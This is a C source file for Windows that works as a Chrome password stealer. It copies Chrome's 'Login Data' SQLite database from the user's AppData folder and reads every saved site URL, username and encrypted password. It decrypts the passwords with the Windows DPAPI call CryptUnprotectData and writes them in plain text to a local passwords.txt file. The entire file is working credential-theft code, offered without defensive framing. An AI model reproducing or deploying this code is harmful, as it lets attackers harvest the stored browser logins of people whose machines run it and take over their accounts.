#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "crypt32.lib")

#include <windows.h>
#include <stdio.h>
#include "sqlite/sqlite3.h"
#include <Shlobj.h> /* CSIDL_LOCAL_APPDATA */

#define CHROME_APP_DATA_PATH  "\\Google\\Chrome\\User Data\\Default\\Login Data"
#define TEMP_DB_PATH          ".\\chromedb_tmp"
#define USER_DATA_QUERY       "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"
#define SECRET_FILE           ".\\passwords.txt"

FILE *file_with_secrets;
int row_id = 1;

static int process_row(void *passed_db, int argc, char **argv, char **col_name);
static int fill_secret_file(char *url,char *username,unsigned char *password);

int main(void)
{
		sqlite3 *logindata_database = NULL; /* represents database where Chrome holds passwords */
		char *err_msg = NULL;
		int result;
		char original_db_location[_MAX_PATH]; /* original location of Login Data */

		memset(original_db_location,0,_MAX_PATH);
		
		if (!SUCCEEDED(SHGetFolderPath(NULL,CSIDL_LOCAL_APPDATA,NULL,0,original_db_location))) {
				fprintf(stderr,"SHGetFolderPath() -> Failed to get path to AppData\n");
				return 0;
		}

		strcat(original_db_location,CHROME_APP_DATA_PATH);
		
		/* Copy chrome database (Login Data) to a temporary location due to possible lock */
		result = CopyFile(original_db_location,TEMP_DB_PATH,FALSE); 
		if (!result) {
				fprintf(stderr,"CopyFile() -> Cannot copy original database\n");
				return 0;
		}
		
		result = sqlite3_open_v2(TEMP_DB_PATH, &logindata_database,SQLITE_OPEN_READONLY,NULL); 
		if (result) {
				fprintf(stderr, "sqlite3_open_v2() -> Cannot open database: %s\n", sqlite3_errstr(result));
				goto out;
		}
		
		file_with_secrets = fopen(SECRET_FILE,"w+");
		if (!file_with_secrets) {
				fprintf(stderr,"fopen() -> File created failed\n");
				goto out;
		}

		result = sqlite3_exec(logindata_database,USER_DATA_QUERY,process_row, logindata_database, &err_msg);
		if (result!=SQLITE_OK) 
				fprintf(stderr, "sqlite3_exec() -> %s (%s)\n", err_msg, sqlite3_errstr(result));

		sqlite3_free(err_msg);
		fclose(file_with_secrets);
out:
		sqlite3_close(logindata_database);
		DeleteFile(TEMP_DB_PATH);	
		return 0;
}
/* 
 * 4th argument of sqlite3_exec is the 1st argument to callback 
 * argc always equals 3, because of our USER_DATA_QUERY 
 * argv[0] = ORIGIN_URL
 * argv[1] = USERNAME_VALUE
 * argv[2] = PASSWORD_VALUE
 */
static int process_row(void *passed_db, int argc, char **argv, char **col_name)
{
		DATA_BLOB encrypted_password;
		DATA_BLOB decrypted_password;
		sqlite3_blob *blob = NULL;
		sqlite3 *db = (sqlite3*)passed_db;
		BYTE *blob_data = NULL;
		unsigned char *password_array = NULL;
		int result;
		int blob_size;
		int i;

		result = sqlite3_blob_open(db,"main","logins","password_value",row_id,0,&blob);
		if (result!=SQLITE_OK) {
				fprintf(stderr,"sqlite3_blob_open() -> %s\n",sqlite3_errstr(result));
				goto out_db;
		}
		
		row_id++;
		
		blob_size = sqlite3_blob_bytes(blob);

		blob_data = malloc(blob_size);
		if (!blob_data) {
				fprintf(stderr,"malloc() -> Failed to allocate memory for blob_data\n");
				goto out_blob;
		}

		result = sqlite3_blob_read(blob, blob_data, blob_size, 0);
		if (result!=SQLITE_OK) {
				fprintf(stderr,"sqlite3_blob_read() -> %s\n",sqlite3_errstr(result));
				goto out_blob_data;
		}

		encrypted_password.pbData = blob_data;
		encrypted_password.cbData = blob_size;
		
		if(!CryptUnprotectData(&encrypted_password, NULL, NULL, NULL, NULL, 0, &decrypted_password)) {
				fprintf(stderr,"CryptUnprotectData() -> Failed to decrypt blob\n");
				goto out_blob_data;
		}
		
		password_array = malloc(decrypted_password.cbData+1);
		if (!password_array) {
				fprintf(stderr,"malloc() -> Failed to allocate memory for password array\n");
				goto out_crypt;
		}

		memset(password_array,0,decrypted_password.cbData);
		
		for(i=0;i<decrypted_password.cbData;i++)
				password_array[i]=(unsigned char)decrypted_password.pbData[i];
		password_array[i] = '\0';

		result = fill_secret_file(argv[0],argv[1],password_array);
		if (result) 
				fprintf(stderr,"fill_secret_file() -> Failed to write to file\n");

		free(password_array);
out_crypt:
		LocalFree(decrypted_password.pbData);
out_blob_data:
		free(blob_data);
out_blob:
		sqlite3_blob_close(blob);
out_db:
		sqlite3_close(db);
		return 0;
}

static int fill_secret_file(char *url,char *username,unsigned char *password)
{
		fputs("URL: ",file_with_secrets);
		fputs(url,file_with_secrets);
		fputs("\nLOGIN: ",file_with_secrets);
		fputs(username,file_with_secrets);
		fputs("\nPASWWORD: ",file_with_secrets);
		fputs(password,file_with_secrets);
		fputs("\n\n",file_with_secrets);
		
		if(ferror(file_with_secrets))
				return 1;
		return 0;
}